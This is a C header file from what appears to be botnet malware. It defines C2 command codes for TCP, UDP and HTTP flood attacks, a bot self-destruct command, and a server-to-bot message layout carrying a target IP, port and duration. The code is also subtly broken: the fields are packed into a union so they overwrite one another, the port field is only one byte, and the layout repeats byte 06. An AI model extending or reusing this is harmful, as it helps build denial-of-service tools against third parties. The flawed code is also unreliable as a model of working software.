#pragma once

#include <stdint.h>

enum command_type
{
    PING = 1 << 0,  // C2 check if bot is alive
    HELLO = 1 << 1, // C2 send this when connection begin
    ATTACK_TCP = 1 << 2,
    ATTACK_UDP = 1 << 3,
    ATTACK_HTTP = 1 << 4,
    EXIT = 1 << 5, // self-destroy bot

    HAS_NO_ARGS = PING | HELLO | EXIT // commands with no args
};

/**
 *   [Server -> Bot]
 *     | BYTE |    DATA     |
 *     |------|-------------|
 *     | 00   | command_type|
 *     | 01   | duration    |
 *     | 02   | target o1   |
 *     | 03   | target o2   |
 *     | 04   | target o3   |
 *     | 05   | target o4   |
 *     | 06   | port        |
 *     | 06   | 0x00 (end)  |
 *   [Bot -> Server]
 *     ...
 */

struct target_ip
{
    uint8_t o1;
    uint8_t o2;
    uint8_t o3;
    uint8_t o4;
};

struct command
{
    enum command_type type;
    union
    {
        uint8_t duration; // Valid for ATTACK_* flags
        struct target_ip target;
        uint8_t port;
    } data;
};

extern const char *__command_type_strings[];

uint8_t parse_command_from_buffer(uint8_t []);
